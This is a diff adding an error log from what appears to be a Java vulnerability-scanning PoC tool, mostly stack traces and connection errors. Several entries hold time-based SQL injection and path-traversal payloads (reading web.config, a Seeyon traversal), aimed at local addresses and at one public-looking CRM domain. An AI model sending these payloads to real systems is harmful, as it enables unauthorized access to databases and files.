@@ -1,0 +1,786 @@
+2024-07-12 11:38:15  [ main:2 ] - [ ERROR ]  ERROR(错误)
+2024-07-12 11:38:55  [ main:3 ] - [ ERROR ]  ERROR(错误)
+2024-07-19 10:19:50  [ main:7 ] - [ ERROR ]  could not read request: %s
+java.lang.NullPointerException: Cannot invoke "java.util.Map.put(Object, Object)" because "this.headers" is null
+	at entity.http.com.attempt.npoc.Raw.AddHeader(Raw.java:18)
+	at http.com.attempt.npoc.RawHttp.readRawRequest(RawHttp.java:53)
+	at http.com.attempt.npoc.RawHttp.main(RawHttp.java:65)
+2024-07-19 10:21:21  [ main:7 ] - [ ERROR ]  could not read request: %s
+java.lang.Exception: malformed request specified: 
+	at http.com.attempt.npoc.RawHttp.readRawRequest(RawHttp.java:42)
+	at http.com.attempt.npoc.RawHttp.main(RawHttp.java:65)
+2024-07-19 10:21:57  [ main:6 ] - [ ERROR ]  java.lang.Exception: malformed request specified: 
+2024-07-19 10:28:44  [ main:6 ] - [ ERROR ]  java.lang.Exception: malformed request specified: Host: {{Hostname}}
+2024-07-19 10:29:16  [ main:6 ] - [ ERROR ]  java.lang.Exception: malformed request specified: Host: {{Hostname}}
+2024-07-19 10:31:35  [ main:6 ] - [ ERROR ]  java.lang.Exception: malformed request specified: Host: {{Hostname}}
+2024-07-19 10:31:39  [ main:13 ] - [ ERROR ]  java.lang.Exception: malformed request specified: Host: {{Hostname}}
+2024-07-19 10:31:54  [ main:8 ] - [ ERROR ]  java.lang.Exception: malformed request specified: Host: {{Hostname}}
+2024-07-19 10:32:04  [ main:7 ] - [ ERROR ]  java.lang.Exception: malformed request specified: Host: {{Hostname}}
+2024-07-19 10:33:41  [ main:86154 ] - [ ERROR ]  java.lang.Exception: malformed request specified: Host: {{Hostname}}
+2024-07-19 10:42:35  [ main:3 ] - [ ERROR ]  java.lang.Exception: malformed request specified: id: CNVD-2024-15077
+2024-07-19 10:43:43  [ main:2 ] - [ ERROR ]  java.lang.Exception: malformed request specified: id: CNVD-2024-15077
+2024-08-01 09:20:27  [ JavaFX Application Thread:0 ] - [ ERROR ]  java.lang.IllegalArgumentException: restricted header name: "Content-Length"
+2024-08-01 10:01:43  [ JavaFX Application Thread:0 ] - [ ERROR ]  java.lang.IllegalArgumentException: unsupported URI http:///BaseModule/SysLog/ReadTxtLog?FileName=../web.config
+2024-08-01 11:27:07  [ JavaFX Application Thread:0 ] - [ ERROR ]  java.lang.IllegalArgumentException: unsupported URI http:///payslip/search/index/userid/time/time?PayslipUser[user_id]=%28SELECT+4655+FROM+%28SELECT%28SLEEP%285%29%29%29usQE%29
+2024-08-01 11:32:51  [ JavaFX Application Thread:0 ] - [ ERROR ]  java.lang.NullPointerException: Cannot invoke "java.net.http.HttpResponse.body()" because the return value of "com.attempt.npoc.entity.HttpResponseWithDuration.getResponse()" is null
+2024-08-01 11:33:35  [ JavaFX Application Thread:44526 ] - [ ERROR ]  java.lang.NullPointerException: Cannot invoke "java.net.http.HttpResponse.body()" because the return value of "com.attempt.npoc.entity.HttpResponseWithDuration.getResponse()" is null
+2024-08-01 11:33:57  [ JavaFX Application Thread:66236 ] - [ ERROR ]  java.lang.NullPointerException: Cannot invoke "java.net.http.HttpResponse.body()" because the return value of "com.attempt.npoc.entity.HttpResponseWithDuration.getResponse()" is null
+2024-08-01 11:41:51  [ JavaFX Application Thread:0 ] - [ ERROR ]  java.lang.IllegalArgumentException: Illegal character in query at index 92: http://crm.ticketsmorecambefc.com/index.php?entryPoint=responseEntryPoint&event=1&delegate=a<"+UNION+SELECT+SLEEP(5);--+-&type=c&response=accept
+2024-08-01 11:55:34  [ JavaFX Application Thread:822947 ] - [ ERROR ]  java.lang.IllegalArgumentException: Illegal character in query at index 95: http://crm.ticketsmorecambefc.com/index.php?entryPoint=responseEntryPoint&event=1&delegate=a%3c"+UNION+SELECT+SLEEP(5);--+-&type=c&response=accept
+2024-08-02 10:11:35  [ JavaFX Application Thread:0 ] - [ ERROR ]  java.lang.IllegalArgumentException: Illegal character in query at index 88: http://192.168.106.41:8000/index.php?entryPoint=responseEntryPoint&event=1&delegate=a%3c"+UNION+SELECT+SLEEP(5);--+-&type=c&response=accept
+2024-08-02 10:23:36  [ JavaFX Application Thread:0 ] - [ ERROR ]  java.lang.IllegalArgumentException: Illegal character in query at index 85: http://192.168.106.41:8000/index.php?entryPoint=responseEntryPoint&event=1&delegate=a<"%2bUNION%2bSELECT%2bSLEEP(5)%3b--%2b-&type=c&response=accept
+2024-08-02 10:24:19  [ JavaFX Application Thread:0 ] - [ ERROR ]  java.lang.IllegalArgumentException: Illegal character in query at index 88: http://192.168.106.41:8000/index.php?entryPoint=responseEntryPoint&event=1&delegate=a%3c"%2bUNION%2bSELECT%2bSLEEP(5)%3b--%2b-&type=c&response=accept
+2024-08-02 15:47:13  [ JavaFX Application Thread:0 ] - [ ERROR ]  java.lang.IllegalArgumentException: Illegal character in query at index 85: http://192.168.106.41:8000/index.php?entryPoint=responseEntryPoint&event=1&delegate=a<"+UNION+SELECT+SLEEP(5);--+-&type=c&response=accept
+2024-08-19 17:18:35  [ JavaFX Application Thread:0 ] - [ ERROR ]  java.lang.StringIndexOutOfBoundsException: begin 0, end -1, length 0
+2024-08-19 17:18:48  [ JavaFX Application Thread:12237 ] - [ ERROR ]  java.lang.StringIndexOutOfBoundsException: begin 0, end -1, length 0
+2024-08-19 17:20:59  [ JavaFX Application Thread:0 ] - [ ERROR ]  java.lang.IllegalArgumentException: unsupported URI http://127.0.0.1:8000%2FBaseModule%2FSysLog%2FReadTxtLog%3FFileName%3D..%2Fweb.config
+2024-08-19 17:21:10  [ JavaFX Application Thread:11662 ] - [ ERROR ]  java.lang.IllegalArgumentException: unsupported URI http://127.0.0.1:8000%2FBaseModule%2FSysLog%2FReadTxtLog%3FFileName%3D..%2Fweb.config
+2024-08-19 17:21:20  [ JavaFX Application Thread:21140 ] - [ ERROR ]  java.lang.IllegalArgumentException: unsupported URI http://127.0.0.1:8000%2Fedu_security_officer%2Fdisable%3BdownloadLogger.action%3Fids%3D1%2BAND%2B%2528SELECT%2B2688%2BFROM%2B%2528SELECT%2528SLEEP%25285%2529%2529%2529kOIi%2529
+2024-08-19 17:21:43  [ JavaFX Application Thread:44483 ] - [ ERROR ]  java.lang.IllegalArgumentException: unsupported URI http://127.0.0.1:8000%2FBaseModule%2FSysLog%2FReadTxtLog%3FFileName%3D..%2Fweb.config
+2024-08-30 17:06:08  [ JavaFX Application Thread:0 ] - [ ERROR ]  java.lang.StringIndexOutOfBoundsException: begin 0, end -1, length 0
+2024-08-30 17:08:50  [ JavaFX Application Thread:0 ] - [ ERROR ]  java.lang.StringIndexOutOfBoundsException: begin 0, end -1, length 0
+2024-08-30 17:10:25  [ JavaFX Application Thread:0 ] - [ ERROR ]  java.lang.IllegalArgumentException: unsupported URI http://127.0.0.1%2FBaseModule%2FSysLog%2FReadTxtLog%3FFileName%3D..%2Fweb.config
+2024-09-03 10:32:16  [ JavaFX Application Thread:0 ] - [ ERROR ]  java.lang.StringIndexOutOfBoundsException: begin 0, end -1, length 0
+2024-09-03 14:49:18  [ JavaFX Application Thread:0 ] - [ ERROR ]  java.lang.NullPointerException: Cannot invoke "java.util.Map.get(Object)" because "values" is null
+2024-09-03 15:12:58  [ JavaFX Application Thread:0 ] - [ ERROR ]  java.lang.StringIndexOutOfBoundsException: begin 0, end -1, length 0
+2024-09-03 15:13:30  [ JavaFX Application Thread:31127 ] - [ ERROR ]  java.net.MalformedURLException: no protocol: 127.0.0.1/BaseModule/SysLog/ReadTxtLog?FileName=../web.config
+2024-09-03 15:14:18  [ JavaFX Application Thread:79583 ] - [ ERROR ]  java.lang.StringIndexOutOfBoundsException: begin 0, end -1, length 0
+2024-09-03 16:24:13  [ JavaFX Application Thread:0 ] - [ ERROR ]  java.net.ConnectException: Connection refused: connect
+2024-09-03 16:25:09  [ JavaFX Application Thread:56560 ] - [ ERROR ]  java.lang.IllegalStateException: connect in progress
+2024-09-03 16:28:06  [ JavaFX Application Thread:233599 ] - [ ERROR ]  java.lang.IllegalStateException: connect in progress
+2024-09-03 16:37:36  [ JavaFX Application Thread:0 ] - [ ERROR ]  java.lang.NullPointerException: Cannot read the array length because "<local12>" is null
+2024-09-03 16:52:45  [ JavaFX Application Thread:0 ] - [ ERROR ]  java.lang.NullPointerException: Cannot read the array length because "<local12>" is null
+2024-09-03 16:57:16  [ JavaFX Application Thread:271600 ] - [ ERROR ]  java.lang.NullPointerException: Cannot read the array length because "<local12>" is null
+2024-09-03 17:04:41  [ JavaFX Application Thread:0 ] - [ ERROR ]  java.lang.NullPointerException: Cannot read the array length because "<local12>" is null
+2024-09-03 17:07:09  [ JavaFX Application Thread:148187 ] - [ ERROR ]  java.lang.NullPointerException: Cannot read the array length because "<local12>" is null
+2024-09-03 17:07:27  [ JavaFX Application Thread:166115 ] - [ ERROR ]  java.lang.NullPointerException: Cannot read the array length because "<local12>" is null
+2024-09-03 17:20:24  [ JavaFX Application Thread:0 ] - [ ERROR ]  java.lang.NullPointerException: Cannot read the array length because "<local12>" is null
+2024-09-04 09:12:56  [ JavaFX Application Thread:0 ] - [ ERROR ]  java.lang.NullPointerException: Cannot read the array length because "<local10>" is null
+2024-09-04 09:14:30  [ JavaFX Application Thread:0 ] - [ ERROR ]  java.lang.NullPointerException: Cannot read the array length because "<local10>" is null
+2024-09-04 09:14:45  [ JavaFX Application Thread:15437 ] - [ ERROR ]  java.lang.NullPointerException: Cannot read the array length because "<local10>" is null
+2024-09-04 09:14:51  [ JavaFX Application Thread:21353 ] - [ ERROR ]  java.lang.NullPointerException: Cannot read the array length because "<local10>" is null
+2024-09-04 09:15:57  [ JavaFX Application Thread:0 ] - [ ERROR ]  java.lang.NullPointerException: Cannot read the array length because "<local10>" is null
+2024-09-04 09:17:19  [ JavaFX Application Thread:0 ] - [ ERROR ]  java.lang.NullPointerException: Cannot read the array length because "<local10>" is null
+2024-09-04 09:18:45  [ JavaFX Application Thread:0 ] - [ ERROR ]  java.lang.NullPointerException: Cannot read the array length because "<local10>" is null
+2024-09-04 09:20:40  [ JavaFX Application Thread:0 ] - [ ERROR ]  java.lang.NullPointerException: Cannot read the array length because "<local10>" is null
+2024-09-04 09:21:46  [ JavaFX Application Thread:0 ] - [ ERROR ]  java.lang.NullPointerException: Cannot read the array length because "<local10>" is null
+2024-09-04 09:24:19  [ JavaFX Application Thread:0 ] - [ ERROR ]  java.net.ConnectException: Connection refused: connect
+2024-09-04 09:27:20  [ JavaFX Application Thread:181662 ] - [ ERROR ]  java.lang.NullPointerException: Cannot invoke "java.time.Duration.toSeconds()" because the return value of "com.attempt.npoc.entity.HttpResponseWithDuration.getDuration()" is null
+2024-09-04 09:33:45  [ JavaFX Application Thread:0 ] - [ ERROR ]  java.lang.NullPointerException: Cannot invoke "com.attempt.npoc.http.HttpURLConnectionResponse.getResponseCode()" because the return value of "com.attempt.npoc.entity.HttpResponseWithDuration.getResponse()" is null
+2024-09-04 09:36:18  [ JavaFX Application Thread:153741 ] - [ ERROR ]  java.lang.NullPointerException: Cannot invoke "com.attempt.npoc.http.HttpURLConnectionResponse.getResponseCode()" because the return value of "com.attempt.npoc.entity.HttpResponseWithDuration.getResponse()" is null
+2024-09-04 09:49:53  [ JavaFX Application Thread:0 ] - [ ERROR ]  java.net.ConnectException: Connection refused: connect
+2024-09-04 09:50:29  [ JavaFX Application Thread:35849 ] - [ ERROR ]  java.net.MalformedURLException: no protocol: /seeyon/autoinstall.do/../../seeyon/privilege/menu.do
+2024-09-04 09:51:29  [ JavaFX Application Thread:95917 ] - [ ERROR ]  java.net.MalformedURLException: no protocol: /seeyon/autoinstall.do/../../seeyon/privilege/menu.do
+2024-09-04 09:53:32  [ JavaFX Application Thread:0 ] - [ ERROR ]  java.net.ConnectException: Connection refused: connect
+2024-09-04 09:53:46  [ JavaFX Application Thread:14508 ] - [ ERROR ]  java.lang.NullPointerException: Cannot invoke "java.time.Duration.toSeconds()" because the return value of "com.attempt.npoc.entity.HttpResponseWithDuration.getDuration()" is null
+2024-09-04 09:55:50  [ JavaFX Application Thread:0 ] - [ ERROR ]  java.net.ConnectException: Connection refused: connect
+2024-09-04 09:56:50  [ JavaFX Application Thread:0 ] - [ ERROR ]  java.net.ConnectException: Connection refused: connect
+2024-09-04 09:58:05  [ JavaFX Application Thread:75334 ] - [ ERROR ]  java.net.ConnectException: Connection refused: connect
+2024-09-04 10:00:44  [ JavaFX Application Thread:0 ] - [ ERROR ]  java.net.ConnectException: Connection refused: connect
+2024-09-04 10:01:16  [ JavaFX Application Thread:31616 ] - [ ERROR ]  java.net.ConnectException: Connection refused: connect
+2024-09-04 10:09:35  [ JavaFX Application Thread:530890 ] - [ ERROR ]  java.net.ConnectException: Connection refused: connect
+2024-09-04 14:52:14  [ JavaFX Application Thread:0 ] - [ ERROR ]  java.net.ConnectException: Connection refused: connect
+2024-09-04 14:52:31  [ JavaFX Application Thread:16978 ] - [ ERROR ]  java.lang.IndexOutOfBoundsException: Index 3 out of bounds for length 1
+2024-09-10 14:13:37  [ JavaFX Application Thread:0 ] - [ ERROR ]  java.net.ConnectException: Connection refused: connect
+2024-09-10 14:14:07  [ JavaFX Application Thread:30054 ] - [ ERROR ]  java.net.MalformedURLException: no protocol: /ispirit/interface/login.php
+2024-09-10 14:15:00  [ JavaFX Application Thread:0 ] - [ ERROR ]  java.net.ConnectException: Connection refused: connect
+2024-09-10 14:16:18  [ JavaFX Application Thread:78222 ] - [ ERROR ]  java.net.ConnectException: Connection refused: connect
+2024-09-10 14:20:26  [ JavaFX Application Thread:0 ] - [ ERROR ]  java.lang.IndexOutOfBoundsException: Index 1 out of bounds for length 1
+2024-09-10 14:26:06  [ JavaFX Application Thread:0 ] - [ ERROR ]  java.lang.NullPointerException: Cannot invoke "com.attempt.npoc.entity.HttpResponseWithDuration.getExkval()" because "extractResponse" is null
+2024-09-10 14:27:55  [ JavaFX Application Thread:0 ] - [ ERROR ]  java.net.ConnectException: Connection refused: connect
+2024-09-10 14:47:06  [ JavaFX Application Thread:0 ] - [ ERROR ]  java.net.ConnectException: Connection refused: connect
+2024-09-10 14:55:10  [ JavaFX Application Thread:0 ] - [ ERROR ]  java.net.ConnectException: Connection refused: connect
+2024-09-10 14:55:23  [ JavaFX Application Thread:12638 ] - [ ERROR ]  java.net.ConnectException: Connection refused: connect
+2024-09-10 14:58:11  [ JavaFX Application Thread:180667 ] - [ ERROR ]  java.net.ConnectException: Connection refused: connect
+2024-09-10 14:59:23  [ JavaFX Application Thread:0 ] - [ ERROR ]  java.net.SocketTimeoutException: Read timed out
+2024-09-10 15:00:13  [ JavaFX Application Thread:50545 ] - [ ERROR ]  java.net.SocketTimeoutException: Read timed out
+2024-09-10 15:12:19  [ JavaFX Application Thread:0 ] - [ ERROR ]  java.net.SocketTimeoutException: Read timed out
+2024-09-10 15:21:15  [ JavaFX Application Thread:0 ] - [ ERROR ]  java.io.FileNotFoundException: http://127.0.0.1:5555/module/appbuilder/assets/print.php
+2024-09-10 15:23:40  [ JavaFX Application Thread:0 ] - [ ERROR ]  java.lang.NullPointerException: Cannot invoke "com.attempt.npoc.http.HttpURLConnectionResponse.getBody()" because the return value of "com.attempt.npoc.entity.HttpResponseWithDuration.getResponse()" is null
+2024-09-10 15:24:13  [ JavaFX Application Thread:0 ] - [ ERROR ]  java.io.FileNotFoundException: http://127.0.0.1:5555/module/appbuilder/assets/print.php
+2024-09-10 15:33:40  [ JavaFX Application Thread:0 ] - [ ERROR ]  java.net.SocketTimeoutException: Read timed out
+2024-09-10 15:36:48  [ JavaFX Application Thread:188255 ] - [ ERROR ]  java.net.SocketTimeoutException: Read timed out
+2024-09-10 15:44:28  [ JavaFX Application Thread:0 ] - [ ERROR ]  java.net.SocketTimeoutException: Read timed out
+2024-09-11 10:09:18  [ Thread-3:0 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task failed after 3 retries
+2024-09-11 10:11:59  [ Thread-3:5 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task failed after 3 retries
+2024-09-11 10:31:36  [ Thread-3:5 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task failed after 3 retries
+2024-09-11 10:33:53  [ Thread-3:2 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task failed after 3 retries
+2024-09-11 10:33:56  [ Thread-3:3007 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task failed after 3 retries
+2024-09-11 10:33:59  [ Thread-3:6010 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task failed after 3 retries
+2024-09-11 10:34:02  [ Thread-3:9014 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task failed after 3 retries
+2024-09-11 10:39:03  [ Thread-3:1 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 10:39:03  [ Thread-3:2 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 10:39:03  [ Thread-3:3 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 10:39:03  [ Thread-3:3 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 10:39:03  [ Thread-3:4 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 10:39:03  [ Thread-3:4 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 10:39:03  [ Thread-3:4 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 10:39:03  [ Thread-3:5 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 10:39:03  [ Thread-3:5 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 10:39:03  [ Thread-3:6 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 10:39:03  [ Thread-3:6 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 10:39:03  [ Thread-3:7 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 10:39:03  [ Thread-3:7 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 10:39:03  [ Thread-3:8 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 10:39:03  [ Thread-3:9 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 10:39:03  [ Thread-3:10 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 10:39:03  [ Thread-3:10 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 10:39:03  [ Thread-3:11 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 10:39:03  [ Thread-3:12 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 10:39:03  [ Thread-3:16 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 10:39:03  [ Thread-3:18 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 10:39:03  [ Thread-3:19 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 10:39:03  [ Thread-3:20 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 10:39:03  [ Thread-3:21 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 10:39:03  [ Thread-3:22 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 10:43:03  [ Thread-3:2 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 10:43:03  [ Thread-3:5 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 10:43:03  [ Thread-3:6 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 10:43:03  [ Thread-3:6 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 10:43:03  [ Thread-3:7 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 10:43:03  [ Thread-3:7 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 10:43:03  [ Thread-3:8 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 10:43:03  [ Thread-3:8 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 10:43:03  [ Thread-3:9 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 10:43:03  [ Thread-3:9 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 10:43:03  [ Thread-3:10 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 10:43:03  [ Thread-3:11 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 10:43:03  [ Thread-3:11 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 10:43:03  [ Thread-3:13 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 10:43:03  [ Thread-3:16 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 10:43:03  [ Thread-3:17 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 10:43:03  [ Thread-3:18 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 10:43:03  [ Thread-3:19 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 10:43:03  [ Thread-3:19 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 10:43:03  [ Thread-3:20 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 10:43:03  [ Thread-3:20 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 10:43:03  [ Thread-3:21 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 10:43:03  [ Thread-3:21 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 10:43:03  [ Thread-3:22 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 10:45:37  [ Thread-3:2 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 10:45:37  [ Thread-3:3 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 10:45:37  [ Thread-3:3 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 10:45:37  [ Thread-3:4 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 10:45:37  [ Thread-3:4 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 10:45:37  [ Thread-3:7 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 10:45:37  [ Thread-3:7 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 10:45:37  [ Thread-3:8 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 10:45:37  [ Thread-3:8 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 10:45:37  [ Thread-3:9 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 10:45:37  [ Thread-3:10 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 10:45:37  [ Thread-3:11 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 10:45:37  [ Thread-3:11 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 10:45:37  [ Thread-3:12 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 10:45:37  [ Thread-3:13 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 10:45:37  [ Thread-3:13 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 10:45:37  [ Thread-3:14 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 10:45:37  [ Thread-3:15 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 10:45:37  [ Thread-3:18 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 10:45:37  [ Thread-3:19 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 10:45:37  [ Thread-3:20 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 10:45:37  [ Thread-3:21 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 10:45:37  [ Thread-3:21 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 10:45:37  [ Thread-3:22 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 10:53:41  [ Thread-3:3 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 10:53:41  [ Thread-3:5 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 10:53:41  [ Thread-3:6 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 10:53:41  [ Thread-3:6 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 10:53:41  [ Thread-3:7 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 10:53:41  [ Thread-3:7 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 10:53:41  [ Thread-3:8 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 10:53:41  [ Thread-3:8 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 10:53:41  [ Thread-3:9 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 10:53:41  [ Thread-3:9 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 10:53:41  [ Thread-3:10 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 10:53:41  [ Thread-3:10 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 10:53:41  [ Thread-3:10 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 10:53:41  [ Thread-3:11 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 10:53:41  [ Thread-3:11 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 10:53:41  [ Thread-3:13 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 10:53:41  [ Thread-3:16 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 10:53:41  [ Thread-3:17 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 10:53:41  [ Thread-3:17 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 10:53:41  [ Thread-3:18 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 10:53:41  [ Thread-3:18 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 10:53:41  [ Thread-3:19 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 10:53:41  [ Thread-3:20 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 10:53:41  [ Thread-3:20 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
+2024-09-11 10:56:43  [ Thread-3:4 ] - [ ERROR ]  Error occurred while executing task: java.lang.RuntimeException: Task was interrupted
